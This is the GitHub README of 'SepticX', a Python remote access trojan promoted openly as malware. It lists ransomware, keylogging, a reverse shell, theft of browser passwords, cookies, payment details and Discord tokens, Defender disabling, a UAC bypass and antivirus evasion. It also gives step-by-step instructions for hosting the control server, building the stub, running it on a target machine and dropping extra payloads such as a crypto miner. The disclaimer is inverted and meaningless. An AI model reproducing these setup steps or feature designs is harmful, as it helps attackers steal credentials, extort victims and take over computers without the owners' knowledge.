# SepticX 🐀

An advanced python Rat Client capable of many malicious tasks

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/5ac4c44d-b94a-4a3f-af9c-07fb1a72edd4)

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/191cc65e-0fa4-4946-a62f-6782ef6fa1c1)

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/37aebb7b-fb65-4ffe-ac57-45a2515fd473)



# Features

This tool is able to do all of these tasks, all at once

 - Completely FUD
 - Add's to startup
 - Trollware
 - Ransomware
 - Auto Spread through discord
 - KeyLogging
 - Reverse Shell (License Required)
 - Spyware accessing, camera, and screen display (License Required)
 - Disable CMD, Registry Editor, TaskMGR, as well as all of the Power buttons including, shut off, restart and sleep
 - Disables Windows Defender
 - UAC Bypass
 - Blocks AV sites
 - Incredibly Accurate VM Detection
 - Bypasses VirusTotal
 - Grabs all Browser credentials, including, Passwords, Cookies, Browser History, and Payment Methods
 - Constantly searches for processes like `Process Hacker` or `Wire Shark` and closes them immediately
 - Grabs Discord tokens, and Roblox cookies

https://www.virustotal.com/gui/file/4e57d1fa0b913feeb707034bea4c48a8bfe131f05401403c29770fcef39e4ec4?nocache=1 <br>
![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/e9782a60-d1da-43b4-89dc-c9b76cf2ec43)


# Setup


Setup can be done pretty quickly!<br>
 - Upload the contents of the server folder into replit
 - delete `main.py` and remame `server.py` to `main.py`

 - Copy and paste example.json into the replit secret manager to set the `ENV` variables, Remember to replace the env variables with your own information
    - For the `key` variable go to [this link](https://emn178.github.io/online-tools/sha256.html) and input whatever password you want, copy the output then set the `ENV` variable to the output from the site 
    
        - This is the same key you will use when building the rat

    - For `t` replace it with your a discord token, so it can dynamically generate webhooks

    - `webhook_generation_logs` is the channel where the log of all webhooks being generated will go and `backup_webhook` is a backup webhook incase it fails to create a webhook

    - The `channel_id` and `channel_id2` are the discord channels where the webhooks will be generated, set them to two different channels in case something happens to the first channel

 - Once you've setup your replit, run compiler.py, and either put your config inside config.json and use that or type in your config manually

- Inside your replit replace output.exe with the stub you created with compiler.py, and logger.exe with whatever file you want, like a crypto miner for example

 - Then run it on a target machine and it should connect

 - To see your keylogs check the logs folder on the replit, everything else will be sent to your discord webhook and finally run `controller.py` to control any connected clients

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/fefe8338-d0d0-482b-81c4-c31d522e026b)


Click the image below for full tutorial:

[![Untitled(2)](https://user-images.githubusercontent.com/78031685/212621717-a016f6f3-2bee-4491-b73d-10bbd7595fed.jpg)](https://www.youtube.com/watch?v=ewUIJRDY3pQ&t=2s)


### Extra

If you go into the `src\files` directory you'll find some files that the Rat load will put onto their pc when the Ransomware runs

If you want you can change wallpaper.jpg and annoy.mp3 to whatever you want. Just keep the filenames the same

For Instructions.txt you can also change it to whatever you want but, if you want instead of putting your wallet address and the amount of money into the file you can use `WALLET` and `AMOUNT` and the program will automatically replace them

# Getting a License

This is only the Open Source version of the client, if you'd like to gain access to the more advanced features like, better obfuscation go to the Offical [Discord Server](https://discord.gg/3xh6ku7HxX)

# Support
If you you'd like to report any bugs or ask for support go to my [Discord Server](https://discord.gg/3xh6ku7HxX)

# Disclaimer

Do not use this tool to remotely access anyone's computer with their consent, for that is illegal by federal law.
